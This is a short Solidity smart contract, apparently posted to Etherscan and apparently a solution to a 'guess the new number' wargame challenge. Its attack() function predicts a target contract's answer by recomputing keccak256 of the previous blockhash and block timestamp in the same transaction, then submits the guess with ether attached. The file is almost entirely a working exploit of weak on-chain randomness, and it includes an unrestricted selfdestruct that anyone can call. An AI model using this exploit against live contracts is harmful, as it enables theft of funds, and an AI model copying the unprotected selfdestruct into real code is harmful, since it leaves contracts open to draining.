/**
 *Submitted for verification at Etherscan.io on 2021-10-27
*/

// SPDX-License-Identifier: MIT

pragma solidity >=0.7.0 <0.9.0;

contract GuessTheNewNumber{

    
    function attack(address payable _contract) payable public returns(bool){
        (bool success,) = _contract.call{value : msg.value}(
            abi.encodeWithSignature("guess(uint8)",uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1),block.timestamp)))))
        );
        return success;
    }
    function destroy() public {
        selfdestruct(payable(msg.sender));
    }

}